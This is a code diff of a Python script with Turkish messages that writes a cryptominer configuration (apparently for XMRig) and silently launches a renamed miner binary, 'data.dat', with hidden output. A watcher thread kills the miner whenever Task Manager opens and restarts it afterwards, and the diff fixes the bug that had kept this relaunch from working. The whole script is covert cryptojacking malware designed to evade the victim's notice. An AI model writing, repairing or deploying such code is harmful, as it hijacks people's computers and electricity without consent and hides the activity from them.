@@ -1,9 +1,10 @@
-import os,subprocess
+import os
+import subprocess
 import psutil
 import time
 import threading    
 
-jsonfiledata="""
+jsonfiledata = """
 {
     "api": {
         "id": null,
@@ -123,35 +124,18 @@ jsonfiledata="""
     "pause-on-battery": false,
     "pause-on-active": false
 }
-
 """
 
-
-
-
-
 def enject():
-    with open("chcekdata","w") as f:
+    with open("chcekdata", "w") as f:
         f.write("True")
 
 
 def start():
-    with open("config.json","w") as config:
+    with open("config.json", "w") as config:
         config.write(jsonfiledata)
-    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,)
-    
-    try:
-        with open("chcekdata","r") as f:
-            if f.read() == "True":
-                pass
-            else:
-                enject()
+    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    except:
-        enject()
-
-    
-        
 
 def kill():
     for process in psutil.process_iter(attrs=['pid', 'name']):
@@ -159,10 +143,11 @@ def kill():
             print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
             process.terminate()  # Programı sonlandır
             process.wait()  # Sonlanmasını bekle
-            print("xmirg.exe başarıyla durduruldu.")
+            print("data.dat başarıyla durduruldu.")
             return True
-    print("xmirg.exe bulunamadı.")
+    print("data.dat bulunamadı.")
     return False
+
 
 def ifapp():
     for process in psutil.process_iter(attrs=['pid', 'name']):
@@ -170,7 +155,6 @@ def ifapp():
             return True
     return False
 
-    
 
 def is_task_manager_open():
     for process in psutil.process_iter(attrs=['name']):
@@ -178,18 +162,18 @@ def is_task_manager_open():
             return True
     return False
 
+
 def task_manager_watcher():
     while True:
         if is_task_manager_open():
             print("Görev Yöneticisi Açıldı!")
             kill()
-        elif ifapp == False:
-            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,)
+        elif not ifapp():
+            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
-          
-
 
 
 task = threading.Thread(target=task_manager_watcher, daemon=True)
 task.start()
+
 start()
